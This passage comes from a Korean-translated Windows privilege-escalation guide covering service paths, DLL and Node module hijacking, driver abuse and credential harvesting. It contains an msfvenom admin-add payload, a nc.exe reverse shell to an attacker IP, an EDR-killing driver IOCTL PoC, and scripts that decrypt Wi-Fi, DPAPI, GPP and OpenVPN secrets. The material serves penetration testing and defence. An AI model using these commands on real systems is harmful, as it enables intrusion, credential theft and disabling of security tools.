for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**metasploit**로 이 취약점을 탐지하고 악용할 수 있습니다: `exploit/windows/local/trusted\_service\_path` **metasploit**로 서비스 binary를 수동으로 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows는 서비스가 실패할 경우 수행할 작업을 사용자가 지정할 수 있도록 허용합니다. 이 기능은 binary를 가리키도록 구성할 수 있습니다. 이 binary를 교체할 수 있다면 privilege escalation이 가능할 수 있습니다. 더 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## Applications

### Installed Applications

**binaries**의 권한(하나를 덮어쓸 수 있고 privilege escalation을 할 수 있는지)과 **folders**의 권한([DLL Hijacking](dll-hijacking/index.html))을 확인하세요.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽기 위해 어떤 config file을 수정할 수 있는지, 또는 Administrator account로 실행될 binary를 수정할 수 있는지 확인하세요 (schedtasks).

시스템에서 약한 folder/file permissions를 찾는 한 가지 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더 아래의 모든 plugin DLL을 자동 로드한다. 쓰기 가능한 portable/copy install이 존재하면, 악성 plugin을 넣는 것만으로 `notepad++.exe`가 실행될 때마다 자동 code execution이 발생한다(`DllMain`과 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**다른 사용자가 실행할 registry 또는 binary를 덮어쓸 수 있는지 확인하라.**\
**권한 상승을 위한 흥미로운 `autoruns` 위치를 더 알아보려면** **다음 페이지를 읽어라**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

가능한 **third party weird/vulnerable** drivers를 찾아라
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step-by-step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화책
- DACL로 제한하려는 device object를 만들 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정합니다.
- 권한 있는 작업에 대해 caller context를 검증합니다. process 종료 또는 handle 반환을 허용하기 전에 PP/PPL 검사를 추가합니다.
- IOCTLs(access masks, METHOD_*, input validation)를 제한하고, 직접적인 kernel privileges 대신 brokered model을 고려합니다.

방어자를 위한 탐지 아이디어
- 의심스러운 device name(예: \\ .\\amsdk*)에 대한 user-mode opens와 abuse를 나타내는 특정 IOCTL 시퀀스를 모니터링합니다.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 강제 적용하고, 자체 allow/deny lists를 유지합니다.


## PATH DLL Hijacking

PATH에 있는 폴더 안에 **write permissions**가 있으면, process가 로드하는 DLL을 hijack하여 **privileges를 escalate**할 수 있습니다.

PATH 안의 모든 폴더 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
더 자세한 정보는 이 체크를 악용하는 방법에 대해:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

이것은 **Windows uncontrolled search path** 변형으로, **Node.js** 및 **Electron** 애플리케이션이 `require("foo")` 같은 bare import를 수행할 때 기대한 module이 **missing**이면 영향을 받습니다.

Node는 디렉터리 트리를 따라 올라가면서 각 상위 경로의 `node_modules` 폴더를 확인해 package를 resolve합니다. Windows에서는 그 탐색이 드라이브 루트까지 도달할 수 있으므로, `C:\Users\Administrator\project\app.js`에서 시작된 애플리케이션은 다음을 확인하게 될 수 있습니다:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user**가 `C:\node_modules`를 만들 수 있다면, 악성 `foo.js`(또는 package 폴더)를 심어 두고 **더 높은 권한의 Node/Electron 프로세스**가 누락된 dependency를 resolve하기를 기다릴 수 있습니다. payload는 피해 프로세스의 security context에서 실행되므로, 대상이 administrator로 실행되거나, elevated scheduled task/service wrapper에서 실행되거나, 자동 시작되는 privileged desktop app에서 실행될 경우 이것은 **LPE**가 됩니다.

특히 다음 경우에 흔합니다:

- dependency가 `optionalDependencies`에 선언된 경우
- third-party library가 `require("foo")`를 `try/catch`로 감싸고 실패해도 계속 진행하는 경우
- package가 production build에서 제거되었거나, packaging 중 누락되었거나, 설치에 실패한 경우
- 취약한 `require()`가 main application code가 아니라 dependency tree 깊숙한 곳에 있는 경우

### 취약한 대상 찾기

**Procmon**을 사용해 resolution path를 증명하세요:

- Filter by `Process Name` = target executable (`node.exe`, the Electron app EXE, or the wrapper process)
- Filter by `Path` `contains` `node_modules`
- `NAME NOT FOUND`와 `C:\node_modules` 아래의 마지막 successful open에 집중하세요

unpacked `.asar` 파일이나 application sources에서 유용한 code-review 패턴:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon 또는 소스 검토를 통해 **누락된 패키지 이름**을 식별한다.
2. 아직 존재하지 않는 경우 root lookup 디렉터리를 생성한다:
```powershell
mkdir C:\node_modules
```
3. 정확히 예상되는 이름의 module을 드롭합니다:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 피해자 애플리케이션을 트리거한다. 애플리케이션이 `require("foo")`를 시도하고 정식 모듈이 없으면, Node는 `C:\node_modules\foo.js`를 로드할 수 있다.

이 패턴에 맞는 누락된 optional modules의 실제 사례로는 `bluebird`와 `utf-8-validate`가 있지만, **technique**의 핵심은 재사용 가능하다는 점이다: privileged Windows Node/Electron 프로세스가 resolve할 **누락된 bare import**를 찾으면 된다.

### Detection and hardening ideas

- 사용자가 `C:\node_modules`를 생성하거나 그 안에 새로운 `.js` 파일/package를 쓰는 경우 alert한다.
- high-integrity processes가 `C:\node_modules\*`에서 읽는지 hunt한다.
- production에서는 모든 runtime dependencies를 package로 포함하고 `optionalDependencies` 사용을 audit한다.
- 서드파티 코드의 조용한 `try { require("...") } catch {}` 패턴을 review한다.
- library가 지원하는 경우 optional probes를 비활성화한다(예: 일부 `ws` deployments는 `WS_NO_UTF_8_VALIDATE=1`로 레거시 `utf-8-validate` probe를 피할 수 있다).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인합니다
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **restricted services**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록 보기, 규칙 생성, 끄기, 끄기...)**

[네트워크 열거를 위한 더 많은 명령은 여기](../basic-cmd-for-pentesters.md#network)

### Linux용 Windows 하위 시스템 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root user를 얻으면 어떤 포트에서든 listen할 수 있습니다(`nc.exe`를 처음으로 사용해 포트를 listen하면, GUI를 통해 `nc`가 firewall에서 허용되어야 하는지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root로 bash를 쉽게 시작하려면 `--default-user root`를 시도할 수 있습니다

`WSL` 파일 시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, **Windows**가 사용자를 자동으로 **로그인**할 수 있게 한다. 처음 보면 이제 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장해 두고 브라우저를 통해 자동으로 로그인할 수 있는 것처럼 보일 수 있다. 하지만 그렇지 않다.

Windows Vault는 Windows가 사용자를 자동으로 로그인할 수 있는 자격 증명을 저장한다. 즉, 자격 증명이 필요한 **Windows 애플리케이션이 리소스에 접근**할 때(서버 또는 웹사이트), **이 Credential Manager** 및 Windows Vault를 사용하여 사용자가 사용자 이름과 비밀번호를 매번 입력하는 대신 제공된 자격 증명을 사용할 수 있다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한, 특정 리소스의 자격 증명을 사용하는 것은 불가능하다고 생각한다. 따라서 애플리케이션이 vault를 사용하려면, 어떤 방식으로든 **credential manager와 통신하여 기본 저장 vault에서 해당 리소스의 자격 증명을 요청**해야 한다.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `/savecred` 옵션과 함께 `runas`를 사용할 수 있습니다. 다음 예시는 SMB 공유를 통해 원격 binary를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 자격 증명으로 `runas` 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)에서.

### DPAPI

**Data Protection API (DPAPI)**는 데이터를 대칭 암호화하는 방법을 제공하며, 주로 Windows 운영 체제에서 비대칭 개인 키의 대칭 암호화에 사용된다. 이 암호화는 사용자 또는 시스템 secret을 활용해 entropy에 크게 기여한다.

**DPAPI는 사용자의 로그인 secret에서 파생된 대칭 키를 통해 키 암호화를 가능하게 한다**. 시스템 암호화가 관련된 경우에는 시스템의 domain authentication secrets를 사용한다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 의미한다. **DPAPI key는 동일한 파일 안에서 사용자의 private keys를 보호하는 master key와 함께 위치하며**, 보통 64바이트의 랜덤 데이터로 구성된다. (이 디렉터리는 접근이 제한되어 있어 CMD의 `dir` 명령으로는 내용을 나열할 수 없지만, PowerShell로는 나열할 수 있다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

The **credentials files protected by the master password** are usually located in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell 자격 증명**은 **스크립팅** 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 방법으로 자주 사용됩니다. 이 자격 증명은 **DPAPI**를 사용해 보호되며, 일반적으로 생성된 동일한 컴퓨터의 동일한 사용자만 해독할 수 있다는 뜻입니다.

파일에 들어 있는 PS 자격 증명을 **decrypt**하려면 다음을 수행할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요 .\
설치 프로그램은 **SYSTEM 권한으로 실행되며**, 많은 경우 **DLL Sideloading**에 취약합니다 (**Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH keys

SSH private keys는 레지스트리 key `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
그 경로 안에서 어떤 항목이라도 찾으면, 아마 저장된 SSH key일 것이다. 이것은 암호화된 상태로 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있다.\
이 기법에 대한 더 많은 정보는 여기에서 확인할 수 있다: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

만약 `ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하라:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. SSH 키를 몇 개 만들고 `ssh-add`로 추가한 뒤 ssh로 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않았고, procmon도 비대칭 키 인증 중 `dpapi.dll` 사용을 식별하지 못했습니다.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit**를 사용하여 이러한 파일도 검색할 수 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**이라는 파일을 검색하세요

### Cached GPP Pasword

이전에 Group Policy Preferences (GPP)를 통해 여러 머신에 사용자 지정 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 하지만 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장되는 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이 GPP의 비밀번호는 인증된 모든 사용자가 복호화할 수 있었습니다. 이는 사용자가 상승된 권한을 얻을 수 있게 할 수 있으므로 심각한 위험이었습니다.

이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함한 로컬 캐시된 GPP 파일을 검색하는 함수가 개발되었습니다. 이러한 파일을 찾으면, 함수는 비밀번호를 복호화하고 사용자 정의 PowerShell 객체를 반환합니다. 이 객체에는 GPP의 세부 정보와 파일 위치가 포함되어 있어, 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.

다음 파일을 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 에서 검색하세요:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
웹 자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

항상 **사용자에게 그의 자격 증명** 또는 심지어 **다른 사용자의 자격 증명**까지 **입력해 달라고 요청**할 수 있습니다. 그가 그것들을 알고 있을 수 있다고 생각한다면(참고로 **클라이언트에게 직접 자격 증명**을 **요청하는 것**은 정말 **위험**합니다):
```bash
